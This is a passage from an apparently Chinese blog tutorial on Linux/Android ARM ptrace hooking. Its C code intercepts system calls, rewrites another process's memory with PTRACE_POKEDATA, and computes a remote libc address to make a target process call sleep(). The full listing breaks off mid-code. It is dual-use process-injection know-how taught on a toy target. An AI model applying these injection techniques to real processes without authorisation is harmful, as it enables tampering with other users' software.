alt=""><br>我们可以看到第一个SysCallNo是162，也就是sleep函数。<br>第二个SysCallNo是4，也就是write函数，因为printf本质就是调用write这个系统调用来完成的。<br>关于system call number对应的具体system call<br>可以参考我在github上的reference文件夹中的<a href="https://github.com/zhengmin1989/TheSevenWeapons/blob/master/LiBieGou/reference/systemcalllist.txt" target="_blank" rel="noopener">systemcalllist.txt</a>文件，里面有对应的列表。<br>我们的hook1程序还对write的参数做了解析，比如1表示stdout，0x1459020表示字符串的地址，19代表字符串的长度。而返回值19表示write成功写入的长度，也就是字符串的长度。</p><h1 id="利用Ptrace动态修改内存"><a href="#利用Ptrace动态修改内存" class="headerlink" title="利用Ptrace动态修改内存"></a>利用Ptrace动态修改内存</h1><p>仅仅是用ptrace来获取system call的参数和返回值还不能体现出ptrace的强大，下面我们就来演示用ptrace读写内存。我们在hook1.c的基础上继续进行修改，在write被调用之前对要输出string进行翻转操作。<br>我们在hookSysCallBefore()函数中加入modifyString(pid, regs.ARM_r1, regs.ARM_r2)这个函数：</p><h2 id="修改内存，转置字符串"><a href="#修改内存，转置字符串" class="headerlink" title="修改内存，转置字符串"></a>修改内存，转置字符串</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hookSysCallBefore</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sysCallNo = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);    </span><br><span class="line">    sysCallNo = getSysCallNo(pid, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Before SysCallNo = %d\n"</span>,sysCallNo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sysCallNo == __NR_write)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__NR_write: %ld %p %ld\n"</span>,regs.ARM_r0,(<span class="keyword">void</span>*)regs.ARM_r1,regs.ARM_r2);</span><br><span class="line">        modifyString(pid, regs.ARM_r1, regs.ARM_r2); <span class="comment">//r1是要打印的字符串的地址，r2是要打印的字符串的长度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modifyString</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> <span class="built_in">strlen</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* str;</span><br><span class="line">    str = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>((<span class="built_in">strlen</span>+<span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">1</span>);<span class="comment">//申请一块空间str，存放要被修改的字符串</span></span><br><span class="line">    getdata(pid, addr, str, <span class="built_in">strlen</span>);<span class="comment">//从要打印的字符串的地址读出字符串，将其存入申请的空间str</span></span><br><span class="line">    reverse(str); <span class="comment">//转置字符串</span></span><br><span class="line">    putdata(pid, addr, str, <span class="built_in">strlen</span>);<span class="comment">//将转置后的字符串放入要打印的字符串的地址，实现修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="getdata和putdata"><a href="#getdata和putdata" class="headerlink" title="getdata和putdata"></a>getdata和putdata</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,</span><br><span class="line">                          child, addr + i * <span class="number">4</span>,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,</span><br><span class="line">                          child, addr + i * <span class="number">4</span>,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getdata()和putdata()分别使用PTRACE_PEEKDATA和PTRACE_POKEDATA对内存进行读写操作。<br>因为ptrace的内存操作一次只能控制4个字节，所以如果修改比较长的内容需要进行多次操作。</p><ul><li><p>PTRACE_PEEKTEXT, PTRACE_PEEKDATA<br>从内存地址中读取四个字节，内存地址由addr给出。</p></li><li><p>PTRACE_POKETEXT, PTRACE_POKEDATA<br>往内存地址中写入四个字节。内存地址由addr给出。</p></li></ul><p><strong>tip:</strong>arm里的word是指四个字节<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo3ak60ksyj30n30b00um.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo3ajnjluij30l903ojs7.jpg" alt=""></p><h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo3anfenaqj30db06g3zb.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo3an95z3vj306g07sgm2.jpg" alt=""></p><h1 id="利用Ptrace动态执行sleep-函数——调用系统so库中的函数"><a href="#利用Ptrace动态执行sleep-函数——调用系统so库中的函数" class="headerlink" title="利用Ptrace动态执行sleep()函数——调用系统so库中的函数"></a>利用Ptrace动态执行sleep()函数——调用系统so库中的函数</h1><p>目标函数是libc.so中的sleep函数.<br>正常情况是每输出一次暂停一秒,现在我们让它暂停10秒</p><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>获取目标进程sleep函数地址<br>在目标进程内执行sleep函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">old_regs</span>,<span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">long</span> sleep_addr;</span><br><span class="line">    <span class="comment">//save old regs</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;regs, &amp;old_regs, <span class="keyword">sizeof</span>(regs));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"getting remote sleep_addr:\n"</span>);</span><br><span class="line">    sleep_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span> *)sleep); <span class="comment">//获取目标进程sleep函数地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> parameters[<span class="number">1</span>];</span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    ptrace_call(pid, sleep_addr, parameters, <span class="number">1</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//restore old regs</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="如何获取函数地址"><a href="#如何获取函数地址" class="headerlink" title="如何获取函数地址"></a>如何获取函数地址</h2><ul><li>已知条件: 本进程的基址、目标进程的基址、本进程中sleep函数的地址(当然,这些已知条件也是需要获得的。<br>/proc/pid/maps文件中存储的是进程内存映射详情,我们可以在这个文件中查询进程中so的基址;<br>sleep函数在本进程中的地址直接可以获得(void*)</li><li>求解: 目标进程中sleep函数地址</li><li>计算: 本进程sleep地址 - 本进程基址 + 目标进程基址</li></ul><h3 id="获取so库的加载基址"><a href="#获取so库的加载基址" class="headerlink" title="获取so库的加载基址"></a>获取so库的加载基址</h3><p>因为libc.so在内存中的地址是随机的，所以我们需要先获取目标进程的libc.so的加载地址，再获取自己进程的libc.so的加载地址和sleep()在内存中的地址。然后我们就能计算出sleep()函数在目标进程中的地址了。要注意的是获取目标进程和自己进程的libc.so的加载地址是通过解析/proc/[pid]/maps得到的。</p><p>打开/proc/pid/maps文件找到基址.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *f;        <span class="comment">//文件指针</span></span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;    <span class="comment">//模块地址</span></span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];    <span class="comment">//maps路径</span></span><br><span class="line">    <span class="keyword">char</span> *pch;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];    <span class="comment">//每行</span></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    f = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(f != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(fgets(line,<span class="keyword">sizeof</span>(line),f))&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name)) &#123; <span class="comment">//找到该行是否含有module_name</span></span><br><span class="line">               pch = strtok(line,<span class="string">"-"</span>); <span class="comment">//分割出基址字符串</span></span><br><span class="line">               addr = strtoul(pch,<span class="literal">NULL</span>,<span class="number">0x10</span>); <span class="comment">//转换为16进制数</span></span><br><span class="line">               <span class="keyword">if</span>(addr == <span class="number">0x8000</span>) <span class="comment">//32位linux程序中默认的text加载地址为0x08408000,64位的改为0x00400000,此时计算base地址就没什么用了</span></span><br><span class="line">                   addr = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(f);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="计算目标进程中sleep函数地址"><a href="#计算目标进程中sleep函数地址" class="headerlink" title="计算目标进程中sleep函数地址"></a>计算目标进程中sleep函数地址</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_remote_addr</span><span class="params">(<span class="keyword">int</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name, <span class="keyword">void</span>* local_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* local_handle = get_module_base(<span class="number">0</span>,module_name); <span class="comment">//本进程的基址</span></span><br><span class="line">    <span class="keyword">void</span>* remote_handle = get_module_base(target_pid,module_name); <span class="comment">//目标进程的基址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"local_handle:%p remote_handle:%p\n"</span>, local_handle, remote_handle);</span><br><span class="line">    <span class="comment">//计算公式</span></span><br><span class="line">    <span class="keyword">long</span> remote_addr = (<span class="keyword">long</span>)((<span class="keyword">uint32_t</span>)local_addr - (<span class="keyword">uint32_t</span>)local_handle + (<span class="keyword">uint32_t</span>)remote_handle);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"remote_addr:%p\n"</span>, remote_addr);</span><br><span class="line">    <span class="keyword">return</span> remote_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何执行sleep函数"><a href="#如何执行sleep函数" class="headerlink" title="如何执行sleep函数"></a>如何执行sleep函数</h2><ul><li>设置函数参数,如果参数个数小于等于4,参数按顺序放入R0~R4寄存器中;如果参数个数大于4,多余的部分需要入栈.</li><li>设置pc寄存器的值,设置当前指令集标志位.</li><li>应用以上寄存器的修改使之生效.</li><li>等待函数执行.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标进程id,目标函数地址,参数地址,参数个数,寄存器地址</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> params_num, struct pt_regs* regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; params_num &amp;&amp; i &lt; <span class="number">4</span>; i++) &#123; <span class="comment">//设置少于4个的参数</span></span><br><span class="line">        regs-&gt;uregs[i] = params[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置多于4个的参数</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; params_num) &#123;</span><br><span class="line">        regs-&gt;ARM_sp -= (params_num - i) * long_size; <span class="comment">//抬高栈顶指针(分配空间)</span></span><br><span class="line">        writeData(pid, (<span class="keyword">long</span>)regs-&gt;ARM_sp, (<span class="keyword">char</span>*)&amp;params[i], (params_num - i) * long_size); <span class="comment">//写入</span></span><br><span class="line">    &#125;</span><br><span class="line">    regs-&gt;ARM_pc = addr; <span class="comment">//设置pc</span></span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123; <span class="comment">//判断是否是Thumb指令</span></span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>); <span class="comment">//Thumb的pc最后一位总是0</span></span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK; <span class="comment">//T标志位为1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//arm</span></span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK; <span class="comment">//T标志位为0</span></span><br><span class="line">    &#125;</span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>; <span class="comment">//为了使sleep函数执行完毕后产生“内存访问错误”,这样我们就知道什么时候执行完了</span></span><br><span class="line">    <span class="keyword">if</span>(ptrace_setregs(pid,regs)==<span class="number">-1</span> || ptrace_continue(pid)==<span class="number">-1</span>)&#123; <span class="comment">//目标进程继续执行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>; <span class="comment">//WUNTRACED表示如果pid进程进入暂停状态，那么waitpid函数立即返回</span></span><br><span class="line">    waitpid(pid,&amp;stat,WUNTRACED); <span class="comment">//等待sleep函数执行,等待过程中本进程暂停执行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, stat);</span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123; <span class="comment">//0xb7f表示目标进程进入暂停状态</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, stat);</span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        waitpid(pid,&amp;stat,WUNTRACED);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整hook代码"><a href="#完整hook代码" class="headerlink" title="完整hook代码"></a>完整hook代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK ( 1u &lt;&lt; 5 )</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *libc_path = <span class="string">"/system/lib/libc.so"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs * regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ptrace_setregs: Can not set register values"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_continue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ptrace_cont"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span 